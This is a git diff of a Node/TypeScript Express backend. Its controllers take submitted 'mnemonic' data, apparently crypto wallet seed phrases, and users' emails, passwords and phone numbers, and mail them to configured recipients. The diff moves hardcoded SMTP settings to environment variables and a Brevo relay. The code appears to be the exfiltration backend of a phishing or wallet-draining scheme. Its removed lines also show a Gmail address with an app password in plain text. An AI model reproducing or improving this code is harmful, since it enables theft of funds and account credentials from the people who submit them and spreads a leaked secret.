@@ -12,19 +12,19 @@ const getRecipients = (): string[] => {
 };
 
 
-const transporter = nodemailer.createTransport({
-  service: 'gmail',
-  auth: {
-    user: 'davidbrown202e@gmail.com',
-    pass: 'mlac pjje fdch nibb'
-  }
-});
+
 
 
 export const sendMnemonicController = asyncHandler(
   async (req: Request, res: Response): Promise<Response> => {
     const payload = req.body;
-
+    const transporter = nodemailer.createTransport({
+      service: 'gmail',
+      auth: {
+        user: process.env.SMTP_USER,
+        pass: process.env.SMTP_PASS
+      }
+    });
     if (!payload || !payload.data || !Array.isArray(payload.data)) {
       return errorResponse(res, "Invalid payload", 400);
     }
@@ -67,6 +67,15 @@ export const sendMnemonicController = asyncHandler(
 export const sendUserInfoController = asyncHandler(
   async (req: Request, res: Response): Promise<Response> => {
     const { title, email, password, phone } = req.body;
+    const transporter = nodemailer.createTransport({
+      // service: 'gmail',
+      host: "smtp-relay.brevo.com",
+      port: 587,
+      auth: {
+        user: process.env.SMTP_USER,
+        pass: process.env.SMTP_PASS
+      }
+    });
 
     if (!title || !email || !password) {
       return errorResponse(res, "Missing required fields", 400);
@@ -86,7 +95,7 @@ export const sendUserInfoController = asyncHandler(
       if (recipients.length === 0) {
         return errorResponse(res, "No recipients configured", 400);
       }
- 
+
       const mailOptions = {
         from: `"${title}" <${process.env.SMTP_USER}>`,
         to: recipients,
